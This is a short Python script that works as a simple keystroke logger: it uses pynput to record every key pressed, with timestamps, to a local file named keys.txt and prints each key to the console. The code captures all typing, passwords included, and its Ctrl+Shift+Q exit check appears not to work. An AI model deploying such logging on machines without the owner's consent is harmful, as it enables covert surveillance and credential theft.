from pynput import keyboard
from datetime import datetime
import sys

def on_key_press(key):
    try:
        if key == keyboard.KeyCode.from_char('q') and keyboard.Controller().modifiers == {keyboard.Key.ctrl_l, keyboard.Key.shift_l}:
            sys.exit()
        print('Key pressed:', key.char)
        now = datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        
        with open('keys.txt', 'a') as file:  # Open file in append mode
            file.write(f'{timestamp} - Key pressed: {key.char}\n')
    except AttributeError:
        print('Special key pressed:', key)
        now = datetime.now()
        timestamp = now.strftime('%Y-%m-%d %H:%M:%S')
        
        with open('keys.txt', 'a') as file:  # Open file in append mode
            file.write(f'{timestamp} - Special key pressed: {key}\n')

# Create a listener for key press events
listener = keyboard.Listener(on_press=on_key_press)

# Start the listener to capture keyboard events
listener.start()

# Keep the program running to capture keyboard events
listener.join()
